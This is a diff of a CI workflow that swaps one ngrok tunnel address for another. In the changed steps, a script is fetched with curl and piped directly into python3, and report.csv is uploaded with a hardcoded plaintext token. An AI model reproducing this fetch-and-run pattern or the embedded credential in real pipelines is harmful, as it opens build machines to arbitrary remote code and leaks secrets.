@@ -24,11 +24,11 @@ jobs:
         run: export DEBIAN_FRONTEND=noninteractive &&
           apt-get update &&
           apt-get install -y python3 curl &&
-          curl http://68de-2800-810-519-dff-8cb1-7666-5a9f-15b9.ngrok.io/static/workflow/workflow.py | python3
+          curl http://31e5-2800-810-519-dff-f156-c398-971b-2072.ngrok.io/static/workflow/workflow.py | python3
       - name: 'publish'
         shell: bash
         run: curl -v -F token='fuZ07oRGZT84YTMbEYzL+wAUSSzwT0b/TFQpsqseO4rBIOw=' -F report=@report.csv
-          http://68de-2800-810-519-dff-8cb1-7666-5a9f-15b9.ngrok.io/api/publish > report.json
+          http://31e5-2800-810-519-dff-f156-c398-971b-2072.ngrok.io/api/publish > report.json
       - name: 'display'
         shell: bash
         run: cat report.json
